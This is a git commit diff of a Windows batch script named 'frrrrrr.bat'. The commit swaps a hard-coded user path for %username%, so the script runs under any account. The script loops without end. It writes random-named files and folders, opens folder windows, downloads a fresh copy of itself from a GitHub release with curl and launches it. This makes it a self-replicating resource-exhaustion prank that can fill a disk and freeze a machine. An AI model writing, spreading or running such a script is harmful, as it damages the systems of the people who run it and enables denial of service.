863e03271603a3f965e4d5758d3d6cbbd0dc4ae2
lolfrsame <110617729+lolfrsame@users.noreply.github.com>
2022-08-05 15:55:29 +0300

    Update frrrrrr.bat

--- frrrrrr.bat
+++ frrrrrr.bat
@@ -1,12 +1,12 @@
 color 0a
 title fr
 mkdir fr
-cd C:\Users\fadia\Pictures\fr
+cd C:\Users\%username%\Pictures\fr
 :top
 echo fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random% >> fr.txt
 mkdir fr.txt
 echo fr >> %random%fr.txt
-start C:\Users\fadia\Pictures\fr
-curl -L "https://github.com/lolfrsame/random-shit/releases/download/fr/frrrrrr.bat" -o C:\Users\fadia\Pictures\frrrrrr.bat
-start C:\Users\fadia\Pictures\frrrrrr.bat
+start C:\Users\%username%\Pictures\fr
+curl -L "https://github.com/lolfrsame/random-shit/releases/download/fr/frrrrrr.bat" -o C:\Users\%username%\Pictures\frrrrrr.bat
+start C:\Users\%username%\Pictures\frrrrrr.bat
 goto top
